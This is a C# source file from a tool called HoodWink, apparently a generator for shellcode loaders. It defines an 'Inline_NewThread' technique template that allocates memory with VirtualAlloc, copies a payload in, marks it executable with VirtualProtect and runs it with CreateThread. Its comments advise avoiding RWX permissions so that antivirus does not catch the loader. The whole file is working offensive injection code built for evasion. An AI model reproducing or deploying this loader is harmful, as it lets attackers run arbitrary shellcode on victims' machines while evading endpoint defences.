using System.Collections.Generic;

namespace HoodWink.Languages.Csharp.Techniques
{
    public class Inline_NewThread : Models.Base.Technique
    {
        public override string Description => "Uses VirtualAlloc & CreateThread";
        public override List<string> FileDependencies => new List<string> { @"Languages\Csharp\FileDependencies\Kernel32.cs" };

        public override string Using => @"using System;
using System.Runtime.InteropServices;
using HoodWink.Languages.Csharp.FileDependencies;";

        public override string ApiImports => @"// to allocate mem
        [DllImport(""kernel32"")]
        static extern IntPtr VirtualAlloc(IntPtr ptr, IntPtr size, IntPtr type, IntPtr mode);

        // to run delegate as unmanaged code
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        delegate void WindowsRun();";

        public override string MainLogic => @"// inptr.zero unless you care abour where it gets allocated
            // try to avoid assigning permissions of RWX, AV may catch that
            var basAddress = Kernel32.VirtualAlloc(IntPtr.Zero, 
                payload.Length, 
                Kernel32.AllocationType.Commit | Kernel32.AllocationType.Reserve,
                Kernel32.MemoryProtection.ReadWrite);

            // could use this
            // Utils.Kernel32.WriteProcessMemory
            // but this is a shortcut
            Marshal.Copy(payload, 0, basAddress, payload.Length);

            Kernel32.VirtualProtect(basAddress, payload.Length, Kernel32.MemoryProtection.ExecuteRead, out _);

            Kernel32.CreateThread(IntPtr.Zero, 0, basAddress, IntPtr.Zero, 0, out var threadId);

            //Console.WriteLine((threadId != IntPtr.Zero) ? ""[+] Success"" : ""[!] Failure"");";

        public override string AdditionalFunctions => @"//Inline_NewThread Additional Functions";
    }
}